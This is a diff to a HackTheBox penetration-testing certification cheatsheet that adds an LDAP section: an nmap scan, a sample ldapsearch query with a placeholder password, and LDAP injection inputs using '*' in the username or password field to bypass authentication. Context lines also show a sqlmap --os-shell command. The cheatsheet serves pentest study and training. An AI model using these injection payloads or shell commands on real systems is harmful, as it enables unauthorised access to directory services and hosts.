@@ -86,6 +86,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
   	- [CGI](#cgi)
   	- [ColdFusion](#coldFusion)
   	- [IIS Tilde Enumeration](#iis-tilde-enumeration)
+  	- [LDAP](#ldap)
 - [Useful Resources](#useful-resources)
 
 
@@ -2155,6 +2156,27 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 	--> egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
 	--> gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
 
+```
+### LDAP
+```
+--> nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
+
+# ldapsearch:- ldapsearch is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service.
+	--> ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
+
+# LDAP Injection by using * in username field OR by using * in password field
+	$username = "*";
+	$password = "dummy";
+	(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+
+OR
+	$username = "dummy";
+	$password = "*";
+	(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+
+OR
+	$username = "*"
+	$password ="*"
 ```
 ## Useful Resources
 
